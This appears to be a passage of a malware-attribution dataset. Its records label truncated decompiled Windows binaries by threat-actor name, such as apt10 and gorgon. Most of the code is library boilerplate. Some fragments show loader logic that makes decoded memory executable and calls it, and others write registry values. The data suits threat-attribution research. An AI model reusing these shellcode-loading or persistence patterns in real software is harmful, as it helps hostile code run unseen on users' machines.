sub_401000(&dword_4A8710);\n      sub_40E0C0();\n    }\n    return DefWindowProcW(v4, a1, wParam, lParam);\n  }\n  if ( a1 == 275 )\n  {\n    sub_401250(&dword_4A8710);\n    return 0;\n  }\n  if ( a1 > 0x10 )\n  {\n    if ( a1 > 0x312 )\n    {\n      if"}
{"author": "gorgon", "label": 5, "inputs": "void sub_401021()\n{\n  ;\n}\nvoid sub_40118C()\n{\n  ;\n}\nvoid sub_40120D()\n{\n  ;\n}\nvoid sub_40129A()\n{\n  ;\n}\nvoid sub_4012BB()\n{\n  ;\n}\nvoid sub_40131F()\n{\n  ;\n}\nint __stdcall sub_40133E(int a1, int a2, int a3, _DWORD *a4)\n{\n  int result; // eax\n\n  if ( *a4 )\n  {\n    result = ((int (__stdcall *)(int, int, int))loc_401133)(a1, a2, a3);\n    *a4 &= result;\n  }\n  return result;\n}\nunsigned __int32 __stdcall sub_401364(int a1, _DWORD *a2)\n{\n  unsigned __int32 result; // eax\n  unsigned int v3; // [esp+0h] [ebp-4h] BYREF\n\n  sub_40133E(a1, (int)&v3, 4, a2);\n  if ( *a2 )\n    result = _byteswap_ulong(v3);\n  else\n    result = 0;\n  return result;\n}\n__int16 __stdcall sub_401390(int a1, _DWORD *a2)\n{\n  __int16 result; // ax\n  __int16 v3; // [esp+2h] [ebp-2h] BYREF\n\n  sub_40133E(a1, (int)&v3, 2, a2);\n  if ( !*a2 )\n    return 0;\n  LOBYTE(result) = HIBYTE(v3);\n  HIBYTE(result) = v3;\n  return result;\n}\nint __stdcall sub_4013BD(int a1, _DWORD *a2)\n{\n  int result; // eax\n  unsigned __int8 v3; // [esp+3h] [ebp-1h] BYREF\n\n  sub_40133E(a1, (int)&v3, 1, a2);\n  if ( *a2 )\n    result = v3;\n  else\n    result = 0;\n  return result;\n}\nvoid __stdcall sub_4013E8(int a1, int a2, _DWORD *a3)\n{\n  if ( *a3 )\n  {\n    if ( ((int (__stdcall *)(int, int))loc_4010C2)(a1, a2) )\n      ((void (__stdcall *)(int, int, int))loc_401047)(a1, a2, 1);\n    else\n      *a3 = 0;\n  }\n}\nint __stdcall sub_401422(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite)\n{\n  DWORD NumberOfBytesWritten; // [esp+4h] [ebp-4h] BYREF\n\n  do\n  {\n    if ( !WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0) || !NumberOfBytesWritten )\n      return 0;\n    lpBuffer = (char *)lpBuffer + NumberOfBytesWritten;\n    nNumberOfBytesToWrite -= NumberOfBytesWritten;\n  }\n  while ( nNumberOfBytesToWrite );\n  return 1;\n}\nint __stdcall sub_40149F(int a1)\n{\n  int v2[2]; // [esp+0h] [ebp-8h] BYREF\n\n  v2[0] = 0;\n  v2[1] = 0;\n  (*(void (__stdcall **)(int, _DWORD, _DWORD, int, int *))(*(_DWORD *)a1 + 20))(a1, 0, 0, 1, v2);\n  return v2[0];\n}\nvoid __stdcall sub_4014E6(int a1, char a"}
{"author": "apt10", "label": 6, "inputs": "int sub_401000()\n{\n  return CWinApp::messageMap;\n}\nint (**sub_401010())()\n{\n  return &off_4046A0;\n}\nvoid *__thiscall sub_401040(void *this, char a2)\n{\n  CWinApp::~CWinApp((CWinApp *)this);\n  if ( (a2 & 1) != 0 )\n    operator delete(this);\n  return this;\n}\n// attributes: thunk\nvoid __thiscall CWinApp::~CWinApp(CWinApp *this)\n{\n  ??1CWinApp@@UAE@XZ(this);\n}\nint sub_401070()\n{\n  unknown_libname_1();\n  return atexit(unknown_libname_2);\n}\n// Microsoft VisualC 2-14/net runtime\n_DWORD *unknown_libname_1()\n{\n  CWinApp::CWinApp((CWinApp *)dword_408A68, 0);\n  dword_408A68[0] = &off_404740;\n  return dword_408A68;\n}\n// Microsoft VisualC 2-14/net runtime\nvoid __cdecl unknown_libname_2()\n{\n  CWinApp::~CWinApp((CWinApp *)dword_408A68);\n}\nint __thiscall sub_4010B0(CWinApp *this)\n{\n  int result; // eax\n  CMultiDocTemplate *v3; // eax\n  CDocTemplate *v4; // edi\n  void *v5; // eax\n  HWND *v6; // edi\n  HWND v7; // eax\n  char v8[8]; // [esp+10h] [ebp-30h] BYREF\n  int v9; // [esp+18h] [ebp-28h]\n  int v10; // [esp+1Ch] [ebp-24h]\n  int v11; // [esp+3Ch] [ebp-4h]\n\n  if ( !AfxSocketInit(0) )\n  {\n    AfxMessageBox(0x68u, 0, 0xFFFFFFFF);\n    return 0;\n  }\n  if ( !AfxOleInit() )\n  {\n    AfxMessageBox(0x64u, 0, 0xFFFFFFFF);\n    return 0;\n  }\n  AfxEnableControlContainer(0);\n  CWinApp::Enable3dControls(this);\n  CWinApp::SetRegistryKey(this, aLocalAppwizard);\n  CWinApp::LoadStdProfileSettings(this, 4u);\n  v3 = (CMultiDocTemplate *)operator new(0x90u);\n  v11 = 0;\n  if ( v3 )\n    v4 = CMultiDocTemplate::CMultiDocTemplate(\n           v3,\n           0x81u,\n           (struct CRuntimeClass *)&off_4048C0,\n           (struct CRuntimeClass *)&off_404DA8,\n           (struct CRuntimeClass *)&off_404B70);\n  else\n    v4 = 0;\n  CDocTemplate::SetContainerInfo(v4, 6u);\n  CDocTemplate::SetServerInfo(v4, 5u, 4u, (struct CRuntimeClass *)&off_404FD8, 0);\n  CWinApp::AddDocTemplate(this, v4);\n  v5 = operator new(0x1E4u);\n  v11 = 1;\n  if ( v5 )\n    v6 = (HWND *)sub_402410(v5);\n  else\n    v6 = 0;\n  v7 = *v6;\n  v11 = -1;\n  result = (*((int (__thiscall **)(HWND *, int, "}
{"author": "apt10", "label": 6, "inputs": "// attributes: thunk\n__int64 sub_140001005()\n{\n  return sub_1400137D0();\n}\n// attributes: thunk\n__int64 sub_14000100A()\n{\n  return sub_140012934();\n}\n// attributes: thunk\n__int64 sub_14000100F()\n{\n  return sub_140007AD0();\n}\n// attributes: thunk\n__int64 sub_140001014()\n{\n  return sub_14000CF0C();\n}\n// attributes: thunk\n__int64 sub_14000101E()\n{\n  return sub_14000CE40();\n}\n// attributes: thunk\n__int64 sub_14000102D()\n{\n  return sub_1400109C4();\n}\n// attributes: thunk\n__int64 sub_140001032()\n{\n  return sub_14001C61C();\n}\n// attributes: thunk\n__int64 __fastcall sub_140001041(int a1, int a2, int a3, int a4, int a5)\n{\n  return sub_140008474(a1, a2, a3, a4, a5);\n}\n// attributes: thunk\n__int64 sub_140001055()\n{\n  return sub_14001DB08();\n}\n// attributes: thunk\n__int64 sub_14000106E()\n{\n  return sub_14000E3C8();\n}\n// attributes: thunk\n__int64 sub_140001073()\n{\n  return sub_140015020();\n}\n// attributes: thunk\n__int64 sub_140001082()\n{\n  return sub_140012850();\n}\n// attributes: thunk\n__int64 sub_140001091()\n{\n  return sub_140011810();\n}\n// attributes: thunk\n__int64 __fastcall sub_1400010AA(int a1, int a2, int a3, int a4, __int64 a5, __int64 a6)\n{\n  return sub_14000BF58(a1, a2, a3, a4, a5, a6);\n}\n// attributes: thunk\n__int64 sub_1400010B4()\n{\n  return sub_140012434();\n}\n// attributes: thunk\n__int64 sub_1400010C8()\n{\n  return sub_140015778();\n}\n// attributes: thunk\n__int64 sub_1400010CD()\n{\n  return sub_1400129A4();\n}\n// attributes: thunk\n__int64 sub_1400010D2()\n{\n  return sub_140007AC8();\n}\n// attributes: thunk\nint __fastcall CompareFunction(const void *a1, const void *a2)\n{\n  return CompareFunction_0(a1, a2);\n}\n// attributes: thunk\nint __fastcall sub_140001104(const void *a1, const void *a2)\n{\n  return sub_140012550(a1, a2);\n}\n// attributes: thunk\n__int64 sub_14000110E()\n{\n  return sub_14000D874();\n}\n// attributes: thunk\n__int64 sub_140001113()\n{\n  return sub_1400156BC();\n}\n// attributes: thunk\n__int64 sub_140001118()\n{\n  return sub_14001B15C();\n}\n// attributes: thunk\n__int64 sub_14000111D()\n{\n  return sub_140004C68();\n}\n//"}
{"author": "apt10", "label": 6, "inputs": "int sub_401000()\n{\n  return CWinApp::messageMap;\n}\nint (**sub_401010())()\n{\n  return &off_4046C0;\n}\nvoid *__thiscall sub_401070(void *this, char a2)\n{\n  sub_401090((CWinApp *)this);\n  if ( (a2 & 1) != 0 )\n    operator delete(this);\n  return this;\n}\nvoid __thiscall sub_401090(CWinApp *this)\n{\n  COleObjectFactory::~COleObjectFactory((CWinApp *)((char *)this + 196));\n  CWinApp::~CWinApp(this);\n}\nint sub_4010E0()\n{\n  unknown_libname_1();\n  return atexit(unknown_libname_2);\n}\n// Microsoft VisualC 2-14/net runtime\n_DWORD *unknown_libname_1()\n{\n  CWinApp::CWinApp((CWinApp *)dword_408A68, 0);\n  COleTemplateServer::COleTemplateServer((COleTemplateServer *)&dword_408A68[49]);\n  dword_408A68[0] = &off_404770;\n  return dword_408A68;\n}\n// Microsoft VisualC 2-14/net runtime\nvoid __cdecl unknown_libname_2()\n{\n  sub_401090((CWinApp *)dword_408A68);\n}\nint __thiscall sub_401120(CWinApp *this)\n{\n  int result; // eax\n  CMultiDocTemplate *v3; // eax\n  CDocTemplate *v4; // edi\n  void *v5; // eax\n  HWND *v6; // edi\n  HWND v7; // eax\n  char v8[8]; // [esp+14h] [ebp-30h] BYREF\n  int v9; // [esp+1Ch] [ebp-28h]\n  int v10; // [esp+20h] [ebp-24h]\n  int v11; // [esp+40h] [ebp-4h]\n\n  if ( !AfxSocketInit(0) )\n  {\n    AfxMessageBox(0x68u, 0, 0xFFFFFFFF);\n    return 0;\n  }\n  if ( !AfxOleInit() )\n  {\n    AfxMessageBox(0x64u, 0, 0xFFFFFFFF);\n    return 0;\n  }\n  AfxEnableControlContainer(0);\n  CWinApp::Enable3dControls(this);\n  CWinApp::SetRegistryKey(this, aLocalAppwizard);\n  CWinApp::LoadStdProfileSettings(this, 4u);\n  v3 = (CMultiDocTemplate *)operator new(0x90u);\n  v11 = 0;\n  if ( v3 )\n    v4 = CMultiDocTemplate::CMultiDocTemplate(\n           v3,\n           0x81u,\n           (struct CRuntimeClass *)&off_4048F0,\n           (struct CRuntimeClass *)&off_404DC0,\n           (struct CRuntimeClass *)&off_404BA0);\n  else\n    v4 = 0;\n  CDocTemplate::SetContainerInfo(v4, 6u);\n  CDocTemplate::SetServerInfo(v4, 5u, 4u, (struct CRuntimeClass *)&off_404FF0, 0);\n  CWinApp::AddDocTemplate(this, v4);\n  COleTemplateServer::ConnectTemplate((CWinApp *)((char *)this"}
{"author": "apt10", "label": 6, "inputs": "// Microsoft VisualC 2-14/net runtime\n// positive sp value has been detected, the output may be wrong!\nvoid *__cdecl unknown_libname_1()\n{\n  return &unk_406890;\n}\nvoid nullsub_2()\n{\n  ;\n}\nint sub_402690()\n{\n  unknown_libname_2();\n  return atexit(unknown_libname_3);\n}\n// Microsoft VisualC 2-14/net runtime\nvoid unknown_libname_2()\n{\n  JUMPOUT(0x402670);\n}\n// Microsoft VisualC 2-14/net runtime\nvoid __cdecl unknown_libname_3()\n{\n  nullsub_2();\n}\n_DWORD *__thiscall sub_4026D0(_DWORD *this)\n{\n  ((void (*)(void))loc_402670)();\n  *(_BYTE *)this = 0;\n  this[67] = 1;\n  return this;\n}\nvoid __thiscall __noreturn sub_4026F0(int this)\n{\n  void *v2; // eax\n  void *v3; // ebx\n  int v4; // eax\n  unsigned int v5; // eax\n  void *v6; // esi\n  SIZE_T v7; // eax\n  DWORD flOldProtect[5]; // [esp+8h] [ebp-18h] BYREF\n  int v9; // [esp+1Ch] [ebp-4h]\n\n  v2 = operator new(0x730u);\n  flOldProtect[1] = (DWORD)v2;\n  v3 = 0;\n  v9 = 0;\n  if ( v2 )\n    v3 = (void *)sub_402860(v2);\n  qmemcpy(v3, (const void *)this, 0x730u);\n  v4 = *(_DWORD *)(this + 272);\n  v9 = -1;\n  if ( v4 )\n  {\n    ((void (__thiscall *)(void *, int, int))loc_402540)(&unk_406FC0, this + 276, this + 536);\n    ((void (__thiscall *)(void *))loc_402580)(&unk_406FC0);\n  }\n  if ( *(_DWORD *)(this + 796) )\n  {\n    sub_402990(String1, (LPCSTR)(this + 800), (LPCSTR)(this + 1320), (LPCSTR)(this + 1580));\n    sub_402A10(String1);\n  }\n  v5 = sub_402870(asc_40507C, 5941, 0);\n  v6 = operator new(v5);\n  v7 = sub_402870(asc_40507C, 5941, v6);\n  VirtualProtect(v6, v7, 0x40u, flOldProtect);\n  ((void (*)(void))v6)();\n  Sleep(0x3E8u);\n  Sleep(0x3E8u);\n  Sleep(0x3E8u);\n  Sleep(0x3E8u);\n  Sleep(0x3E8u);\n  exit(0);\n}\nint sub_402820()\n{\n  unknown_libname_4();\n  return atexit(unknown_libname_5);\n}\n// Microsoft VisualC 2-14/net runtime\nvoid unknown_libname_4()\n{\n  JUMPOUT(0x402670);\n}\n// Microsoft VisualC 2-14/net runtime\nvoid __cdecl unknown_libname_5()\n{\n  nullsub_2();\n}\nvoid *__thiscall sub_402860(void *this)\n{\n  ((void (*)(void))loc_402670)();\n  return this;\n}\nunsigned int *__thiscall sub_402870(_DW"}
{"author": "apt10", "label": 6, "inputs": "int __thiscall sub_10001000(_DWORD *this)\n{\n  *this = &std::bad_alloc::`vftable';\n  return sub_10004F56();\n}\nvoid *__thiscall sub_10001010(void *this, char a2)\n{\n  *(_DWORD *)this = &std::bad_alloc::`vftable';\n  sub_10004F56();\n  if ( (a2 & 1) != 0 )\n    operator delete(this);\n  return this;\n}\n// attributes: thunk\nint sub_10001040()\n{\n  return sub_10004F56();\n}\nstruct std::_Locinfo *__userpurge sub_10001050@<eax>(const char *a1@<edi>, struct std::_Locinfo *a2)\n{\n  int pExceptionObject[3]; // [esp+Ch] [ebp-1Ch] BYREF\n  char *v4; // [esp+18h] [ebp-10h] BYREF\n  int v5; // [esp+24h] [ebp-4h]\n\n  std::_Lockit::_Lockit(a2, 0);\n  v5 = 0;\n  *((_DWORD *)a2 + 1) = 0;\n  *((_BYTE *)a2 + 8) = 0;\n  *((_DWORD *)a2 + 3) = 0;\n  *((_BYTE *)a2 + 16) = 0;\n  *((_DWORD *)a2 + 5) = 0;\n  *((_BYTE *)a2 + 24) = 0;\n  *((_DWORD *)a2 + 7) = 0;\n  *((_BYTE *)a2 + 32) = 0;\n  LOBYTE(v5) = 4;\n  if ( !a1 )\n  {\n    v4 = \"bad locale name\";\n    std::exception::exception((std::exception *)pExceptionObject, (const char *const *)&v4);\n    pExceptionObject[0] = (int)&std::runtime_error::`vftable';\n    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVruntime_error_std__);\n  }\n  std::_Locinfo::_Locinfo_ctor(a2, a1);\n  return a2;\n}\nvoid __stdcall sub_100010F0(struct std::_Locinfo *a1)\n{\n  std::_Locinfo::_Locinfo_dtor(a1);\n  if ( *((_DWORD *)a1 + 7) )\n    free(*((void **)a1 + 7));\n  *((_DWORD *)a1 + 7) = 0;\n  if ( *((_DWORD *)a1 + 5) )\n    free(*((void **)a1 + 5));\n  *((_DWORD *)a1 + 5) = 0;\n  if ( *((_DWORD *)a1 + 3) )\n    free(*((void **)a1 + 3));\n  *((_DWORD *)a1 + 3) = 0;\n  if ( *((_DWORD *)a1 + 1) )\n    free(*((void **)a1 + 1));\n  *((_DWORD *)a1 + 1) = 0;\n  std::_Lockit::~_Lockit(a1);\n}\nstd::exception *__thiscall sub_100011A0(std::exception *this, struct exception *a2)\n{\n  std::exception::exception(this, a2);\n  *(_DWORD *)this = &std::runtime_error::`vftable';\n  return this;\n}\nvoid __thiscall std::locale::facet::_Incref(std::locale::facet *this)\n{\n  int v2; // eax\n  char v3[4]; // [esp+4h] [ebp-4h] BYREF\n\n  std::_Lockit::_Lockit((std::_Lockit *"}
{"author": "apt10", "label": 6, "inputs": "void __cdecl __noreturn sub_401000(int a1, HMODULE a2)\n{\n  _DWORD *v2; // eax\n  _DWORD *v3; // esi\n  int v4; // eax\n  int v5; // ecx\n  HMODULE v6; // ebx\n  _DWORD *v7; // edi\n  int v8; // edx\n  char *v9; // ecx\n  int v10; // eax\n  DWORD v11; // eax\n  HMODULE v12; // eax\n  int v13; // edi\n  HMODULE *v14; // ebx\n  int v15; // eax\n  int v16; // [esp+0h] [ebp-1234h]\n  int v17; // [esp+4h] [ebp-1230h]\n  int v18; // [esp+8h] [ebp-122Ch]\n  int v19; // [esp+Ch] [ebp-1228h]\n  int v20; // [esp+10h] [ebp-1224h]\n  int v21; // [esp+14h] [ebp-1220h]\n  int v22; // [esp+18h] [ebp-121Ch]\n  int v23; // [esp+1Ch] [ebp-1218h]\n  int v24; // [esp+20h] [ebp-1214h]\n  int v25; // [esp+24h] [ebp-1210h]\n  int v26; // [esp+28h] [ebp-120Ch]\n  int v27; // [esp+2Ch] [ebp-1208h]\n  int v28; // [esp+30h] [ebp-1204h]\n  int v29; // [esp+34h] [ebp-1200h]\n  int v30; // [esp+38h] [ebp-11FCh]\n  int v31; // [esp+3Ch] [ebp-11F8h]\n  int v32; // [esp+40h] [ebp-11F4h]\n  int v33; // [esp+44h] [ebp-11F0h]\n  int v34; // [esp+48h] [ebp-11ECh]\n  int v35; // [esp+4Ch] [ebp-11E8h]\n  HMODULE hModule; // [esp+41Ch] [ebp-E18h] BYREF\n  char v37[3076]; // [esp+420h] [ebp-E14h] BYREF\n  DWORD flOldProtect; // [esp+1024h] [ebp-210h] BYREF\n  WCHAR Filename[260]; // [esp+1028h] [ebp-20Ch] BYREF\n\n  hModule = a2;\n  operator new(0x208u);\n  v2 = operator new(0x318u);\n  v3 = v2;\n  if ( v2 )\n  {\n    *((_BYTE *)v2 + 264) = 1;\n    v2[67] = 1;\n  }\n  else\n  {\n    v3 = 0;\n  }\n  v3[65] = Size;\n  memmove(v3, (char *)&dword_4181D0 + dword_4181D8, Size);\n  v4 = dword_4181D0;\n  v5 = dword_4181DC;\n  v3[67] = dword_4181D0;\n  if ( v4 == 1 )\n    v6 = (HMODULE)(v5 + v3[65]);\n  else\n    v6 = hModule;\n  v7 = VirtualAlloc(0, (SIZE_T)v6, 0x3000u, 0x40u);\n  if ( v7 )\n  {\n    v7 = operator new((size_t)v6);\n    VirtualProtect(v7, (SIZE_T)v6, 0x40u, &flOldProtect);\n  }\n  v3[65] = Size;\n  memmove(v3, (char *)&dword_4181D0 + dword_4181D8, Size);\n  v8 = dword_4181DC;\n  v9 = (char *)&dword_4181D0 + dword_4181E0;\n  v10 = dword_4181D0;\n  v3[67] = dword_4181D0;\n  if ( v10 == 1 )\n    v11 = sub_401230(v9, v8, v"}
{"author": "apt10", "label": 6, "inputs": "char *__thiscall sub_401000(char *this)\n{\n  int *v2; // edi\n  int v3; // edi\n  int v4; // eax\n  int v6; // [esp+8h] [ebp-40h]\n  int v7[4]; // [esp+18h] [ebp-30h] BYREF\n  int v8[3]; // [esp+28h] [ebp-20h] BYREF\n  int v9[2]; // [esp+34h] [ebp-14h] BYREF\n  int v10; // [esp+44h] [ebp-4h]\n\n  v2 = (int *)(this + 24);\n  *((float *)this + 5) = 0.0;\n  v7[0] = 1;\n  *((float *)this + 4) = 0.0;\n  v7[1] = 0;\n  *((float *)this + 3) = 0.0;\n  v7[2] = 0;\n  v7[3] = 0;\n  *((float *)this + 2) = 0.0;\n  *((_DWORD *)this + 6) = -16777216;\n  *((float *)this + 13) = 0.0;\n  *((float *)this + 12) = 0.0;\n  *((float *)this + 11) = 0.0;\n  *((float *)this + 10) = 0.0;\n  *((float *)this + 28) = 0.0;\n  *((float *)this + 27) = 0.0;\n  *((float *)this + 26) = 0.0;\n  *((float *)this + 25) = 0.0;\n  *((float *)this + 32) = 0.0;\n  *((float *)this + 31) = 0.0;\n  *((float *)this + 30) = 0.0;\n  *((float *)this + 29) = 0.0;\n  *(_DWORD *)this = &off_40F288;\n  GdiplusStartup(this + 140, v7, 0);\n  *v2 = -15458776;\n  sub_4018C4(v2);\n  v3 = *v2;\n  v10 = 0;\n  v9[0] = 0;\n  v9[1] = GdipCreatePen1(v3, 1.0, 0, v9);\n  LOBYTE(v10) = 1;\n  *((_DWORD *)this + 8) = sub_40184E(v8);\n  v4 = sub_40192D(v9);\n  v6 = v9[0];\n  *((_DWORD *)this + 7) = v4;\n  GdipDeletePen(v6);\n  v8[0] = (int)&off_40F280;\n  GdipDeleteBrush(v8[1]);\n  return this;\n}\nLPVOID __thiscall sub_401103(LPVOID lpMem, char a2)\n{\n  sub_40111F();\n  if ( (a2 & 1) != 0 )\n    sub_40427B(lpMem);\n  return lpMem;\n}\nint __thiscall sub_40111F(_DWORD *this)\n{\n  int v2; // [esp-4h] [ebp-4h]\n\n  v2 = this[35];\n  *this = &off_40F288;\n  return GdiplusShutdown(v2);\n}\nint __thiscall sub_401131(int this, HWND hWnd)\n{\n  HDC v3; // eax\n  double v4; // st7\n  int v5; // eax\n  int v6; // eax\n  double v7; // st6\n  double v8; // st5\n  double v9; // st6\n  double v10; // st5\n  float v11; // eax\n  struct tagRECT Rect; // [esp+4h] [ebp-18h] BYREF\n  float v14; // [esp+14h] [ebp-8h]\n  float v15; // [esp+18h] [ebp-4h]\n  HWND hWnda; // [esp+24h] [ebp+8h]\n  float hWndb; // [esp+24h] [ebp+8h]\n\n  *(_DWORD *)(this + 132) = hWnd;\n  v3 = GetDC(hWnd);"}
{"author": "apt10", "label": 6, "inputs": "_WORD *__thiscall sub_401000(_WORD *this)\n{\n  *(_DWORD *)this = &off_4043E8;\n  memset(this + 2, 0, 0x20u);\n  this[18] = 0;\n  return this;\n}\nvoid *__thiscall sub_401020(void *this, char a2)\n{\n  sub_401040();\n  if ( (a2 & 1) != 0 )\n    operator delete(this);\n  return this;\n}\nvoid __thiscall sub_401040(_DWORD *this)\n{\n  *this = &off_4043E8;\n}\nvoid __stdcall nullsub_2(int a1, int a2, int a3, int a4)\n{\n  ;\n}\n_WORD *__thiscall sub_401060(char *this, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9)\n{\n  _WORD *result; // eax\n  int v11; // edi\n  int *v12; // ecx\n  _WORD *v13; // edx\n  int v14; // esi\n  bool v15; // zf\n  int v16; // [esp+10h] [ebp-10h]\n  int v17; // [esp+14h] [ebp-Ch]\n  char *v18; // [esp+18h] [ebp-8h]\n  int v19; // [esp+1Ch] [ebp-4h]\n  int v20; // [esp+2Ch] [ebp+Ch]\n  _WORD *v21; // [esp+30h] [ebp+10h]\n  int *v22; // [esp+38h] [ebp+18h]\n\n  v18 = this;\n  v19 = -a7;\n  v16 = 0;\n  result = this + 4;\n  v11 = a4 + a7 * a5;\n  v17 = 4;\n  while ( 1 )\n  {\n    v12 = (int *)&this[8 * v16 + 44];\n    v13 = result;\n    v22 = v12;\n    v21 = result;\n    v14 = a3 + a7 * a6;\n    v20 = 4;\n    do\n    {\n      if ( *v13 == 1 )\n      {\n        if ( a2 )\n        {\n          Rectangle(*(HDC *)(a2 + 4), v14, v11, v14 + a7, v11 + a7);\n          v12 = v22;\n          v13 = v21;\n        }\n        *(v12 - 1) = v14;\n        *v12 = v11;\n        v12 += 2;\n        ++v16;\n        v22 = v12;\n      }\n      ++v13;\n      v14 -= a7;\n      v15 = v20 == 1;\n      v21 = v13;\n      --v20;\n    }\n    while ( !v15 );\n    result = v13;\n    v11 += v19;\n    if ( !--v17 )\n      break;\n    this = v18;\n  }\n  return result;\n}\nint __thiscall sub_401140(int this, int a2, int a3, int a4, __int16 a5)\n{\n  int result; // eax\n\n  sub_4014D0();\n  result = a5;\n  switch ( a5 )\n  {\n    case 0:\n      result = 1;\n      *(_DWORD *)(this + 72) = 3;\n      *(_WORD *)(this + 14) = 1;\n      *(_WORD *)(this + 22) = 1;\n      *(_WORD *)(this + 30) = 1;\n      *(_WORD *)(this + 32) = 1;\n      *(_DWORD *)(this + 76) = 2;\n      break;\n    case 1:\n      result = 1;\n      *("}
{"author": "apt10", "label": 6, "inputs": "void sub_401000()\n{\n  sub_401010();\n  JUMPOUT(0x401020);\n}\nCHAR *sub_401010()\n{\n  GetModuleFileNameA(0, &ValueName[260], 0x104u);\n  return ValueName;\n}\nint __thiscall sub_401060(LPSTR lpString1, LPCSTR a2, LPCSTR lpString2)\n{\n  lstrcpynA(lpString1 + 260, lpString2, 260);\n  lstrcpynA(lpString1, a2, 260);\n  return 1;\n}\nvoid nullsub_2()\n{\n  ;\n}\nint __thiscall sub_4010B0(LPCSTR lpValueName)\n{\n  int v2; // eax\n  LSTATUS v3; // eax\n  const CHAR *v5; // [esp-4h] [ebp-1Ch]\n  int v6; // [esp-4h] [ebp-1Ch]\n  int v7; // [esp-4h] [ebp-1Ch]\n  HKEY phkResult; // [esp+10h] [ebp-8h] BYREF\n  int v9; // [esp+14h] [ebp-4h]\n\n  phkResult = 0;\n  if ( !RegCreateKeyA(HKEY_LOCAL_MACHINE, SubKey, &phkResult) || !RegCreateKeyA(HKEY_CURRENT_USER, SubKey, &phkResult) )\n  {\n    v9 = 0;\n    do\n    {\n      if ( v9 >= 10 )\n        break;\n      v2 = lstrlenA(lpValueName);\n      v5 = lpValueName + 260;\n      if ( v2 > 0 )\n      {\n        v7 = lstrlenA(v5);\n        v3 = RegSetValueExA(phkResult, lpValueName, 0, 1u, (const BYTE *)lpValueName + 260, v7);\n      }\n      else\n      {\n        v6 = lstrlenA(v5);\n        v3 = RegSetValueExA(phkResult, 0, 0, 1u, (const BYTE *)lpValueName + 260, v6);\n      }\n      ++v9;\n    }\n    while ( !v3 );\n  }\n  RegCloseKey(phkResult);\n  return 0;\n}\nint sub_401160()\n{\n  sub_401170();\n  return atexit(unknown_libname_1);\n}\nIostream_init *sub_401170()\n{\n  return Iostream_init::Iostream_init((Iostream_init *)&unk_4069C0);\n}\n// Microsoft VisualC 2-14/net runtime\nvoid __cdecl unknown_libname_1()\n{\n  nullsub_2();\n}\nIostream_init *__thiscall Iostream_init::Iostream_init(Iostream_init *this)\n{\n  return this;\n}\nint sub_4011B0()\n{\n  unknown_libname_2();\n  return atexit(unknown_libname_3);\n}\n// Microsoft VisualC 2-14/net runtime\nIostream_init *unknown_libname_2()\n{\n  return Iostream_init::Iostream_init((Iostream_init *)&unk_4070F0);\n}\n// Microsoft VisualC 2-14/net runtime\nvoid __cdecl unknown_libname_3()\n{\n  nullsub_2();\n}\nIostream_init *__thiscall sub_4011F0(Iostream_init *this)\n{\n  Iostream_init::Iostream_init(this);\n  *(_BYTE *)"}
{"author": "apt10", "label": 6, "inputs": "void **sub_403700()\n{\n  return &off_402F68;\n}\nvoid *__thiscall sub_403730(void *this, char a2)\n{\n  CWinApp::~CWinApp((CWinApp *)this);\n  if ( (a2 & 1) != 0 )\n    operator delete(this);\n  return this;\n}\n// attributes: thunk\nvoid __thiscall CWinApp::~CWinApp(CWinApp *this)\n{\n  ??1CWinApp@@UAE@XZ(this);\n}\nint sub_403760()\n{\n  unknown_libname_1();\n  return atexit(unknown_libname_2);\n}\n// Microsoft VisualC 2-14/net runtime\nvoid *unknown_libname_1()\n{\n  CWinApp::CWinApp((CWinApp *)&dword_404B78, 0);\n  dword_404B78 = &off_403008;\n  return &dword_404B78;\n}\n// Microsoft VisualC 2-14/net runtime\nvoid __cdecl unknown_libname_2()\n{\n  CWinApp::~CWinApp((CWinApp *)&dword_404B78);\n}\nint __thiscall sub_4037A0(CWinApp *this)\n{\n  CSingleDocTemplate *v2; // eax\n  struct CDocTemplate *v3; // eax\n  int result; // eax\n  char v5[36]; // [esp+8h] [ebp-30h] BYREF\n  int v6; // [esp+34h] [ebp-4h]\n\n  AfxEnableControlContainer(0);\n  CWinApp::Enable3dControls(this);\n  CWinApp::SetRegistryKey(this, aLocalAppwizard);\n  CWinApp::LoadStdProfileSettings(this, 4u);\n  v2 = (CSingleDocTemplate *)operator new(0x6Cu);\n  v6 = 0;\n  if ( v2 )\n    v3 = CSingleDocTemplate::CSingleDocTemplate(\n           v2,\n           0x80u,\n           (struct CRuntimeClass *)&off_403188,\n           (struct CRuntimeClass *)&off_403440,\n           (struct CRuntimeClass *)&off_403278);\n  else\n    v3 = 0;\n  v6 = -1;\n  CWinApp::AddDocTemplate(this, v3);\n  CCommandLineInfo::CCommandLineInfo((CCommandLineInfo *)v5);\n  v6 = 1;\n  CWinApp::ParseCommandLine(this, (struct CCommandLineInfo *)v5);\n  if ( CWinApp::ProcessShellCommand(this, (struct CCommandLineInfo *)v5) )\n  {\n    CWnd::ShowWindow(*((CWnd **)this + 8), 5);\n    UpdateWindow(*(HWND *)(*((_DWORD *)this + 8) + 32));\n    v6 = -1;\n    CCommandLineInfo::~CCommandLineInfo((CCommandLineInfo *)v5);\n    result = 1;\n  }\n  else\n  {\n    v6 = -1;\n    CCommandLineInfo::~CCommandLineInfo((CCommandLineInfo *)v5);\n    result = 0;\n  }\n  return result;\n}\nCDialog *__thiscall sub_4038C0(CDialog *this)\n{\n  CDialog::CDialog(this, 0x64u, 0);\n  *(_"}
{"author": "pacifier", "label": 7, "inputs": "void *__thiscall sub_10001000(void *Block, char a2)\n{\n  *(_DWORD *)Block = &std::error_category::`vftable';\n  if ( (a2 & 1) != 0 )\n    j__free(Block);\n  return Block;\n}\n_DWORD *__thiscall std::error_category::default_error_condition(void *this, _DWORD *a2, int a3)\n{\n  _DWORD *result; // eax\n\n  result = a2;\n  *a2 = a3;\n  a2[1] = this;\n  return result;\n}\nbool __thiscall sub_10001050(void *this, int a2, _DWORD *a3)\n{\n  _DWORD *v3; // eax\n  char v5[8]; // [esp+0h] [ebp-8h] BYREF\n\n  v3 = (_DWORD *)(*(int (__thiscall **)(void *, char *, int))(*(_DWORD *)this + 12))(this, v5, a2);\n  return v3[1] == a3[1] && *v3 == *a3;\n}\nbool __thiscall sub_10001090(void *this, _DWORD *a2, int a3)\n{\n  return this == (void *)a2[1] && *a2 == a3;\n}\nconst char *sub_100010B0()\n{\n 